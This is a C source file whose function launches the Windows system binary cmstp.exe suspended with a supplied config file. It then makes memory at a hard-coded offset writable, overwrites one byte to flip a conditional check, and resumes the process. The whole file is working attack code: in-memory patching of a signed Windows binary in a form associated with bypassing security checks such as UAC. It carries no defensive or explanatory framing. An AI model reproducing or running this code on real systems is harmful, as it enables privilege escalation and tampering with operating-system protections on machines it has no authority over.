#include "CmstpPatcher.h"

BOOL CmstpPatcher(PWCHAR pszConfig) {
	 
	WCHAR				szCmstp[]			= L"C:\\Windows\\System32\\cmstp.exe /au /s ";
	STARTUPINFO         si					= { 0 };
	PROCESS_INFORMATION pi					= { 0 };
	PWCHAR				lpCommandLineW		= NULL;
	SIZE_T				sLength				= 0;

	ULONGLONG			uImageBase			= NULL;
	ULONGLONG			uPatchAddress		= NULL;
	ULONGLONG			uPatchOffset		= 0x78A9;
	
	DWORD				flOldProtection		= 0x0;
	SIZE_T              sBytesWritten		= 0;
	BYTE				Patch				= 0x85;
	BOOL				status				= TRUE;

	si.cb = sizeof(si);

	/* config exist? */
	if (!PathFileExistsW(pszConfig)) {
		PRINT("File Does Not Exist\n");
		return (FALSE);
	}

	sLength = lstrlenW(pszConfig) + sizeof(szCmstp) + 1;
	if (!(lpCommandLineW = LocalAlloc(LMEM_ZEROINIT, sLength * sizeof(WCHAR)))) {
		PRINT("LocalAlloc() Failed: %d\n", GetLastError());
		return (FALSE);
	}
	
	StrCatBuffW(lpCommandLineW, szCmstp, sLength);
	StrCatBuffW(lpCommandLineW, pszConfig, sLength);

	PRINT("[*] Spawn suspended cmstp.exe\n");
	if (!CreateProcessW(NULL, lpCommandLineW, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("[!] CreateProcessW() Failed: %d\n", GetLastError());
		status = FALSE;
		goto END;
	}

	PRINT("\t|-- Handle: %X\n", pi.hProcess);

	/* retrieve the remote process image base */
	if (!(uImageBase = (ULONG_PTR)GetProcessImageBase(pi.hProcess))) {
		PRINT("GetProcessImageBase() Failed\n");
		status = FALSE;
		goto END;
	}

	PRINT("\t|-- Image Base: %p\n", uImageBase);

	uPatchAddress = uImageBase + uPatchOffset;

	/* change memory permessions to RWX */
	if (!VirtualProtectEx(pi.hProcess, (LPVOID)uPatchAddress, 0x400, PAGE_EXECUTE_READWRITE, &flOldProtection)) {
		PRINT("VirtualProtectEx() Failed: %d\n", GetLastError());
		status = FALSE;
		goto END;
	}

	PRINT("[*] Patching byte 0x84 at 0x%p with 0x85...\n", uPatchAddress);
	if (!WriteProcessMemory(pi.hProcess, (LPVOID)uPatchAddress, &Patch, sizeof(BYTE), &sBytesWritten)) {
		PRINT("WriteProcessMemory() Failed: %d", GetLastError());
		return (FALSE);
	}

	PRINT("[*] Resume cmstp.exe\n");
	if (ResumeThread(pi.hThread) == -1) {
		PRINT("ResumeThread() Failed: %d\n", GetLastError());
		status = FALSE;
		goto END;
	}

	Sleep(1000);

	PRINT("[*] Killing cmstp.exe...\n");
	if (!TerminateProcess(pi.hProcess, EXIT_SUCCESS)) {
		PRINT("TerminateProcess() Failed: %d", GetLastError());
		return (FALSE);
	}

	PRINT("[+] DONE!\n");
END:
	if (pi.hThread)			CloseHandle(pi.hThread);
	if (pi.hProcess)		CloseHandle(pi.hProcess);
	if (lpCommandLineW)		LocalFree(lpCommandLineW);

	return (status);
}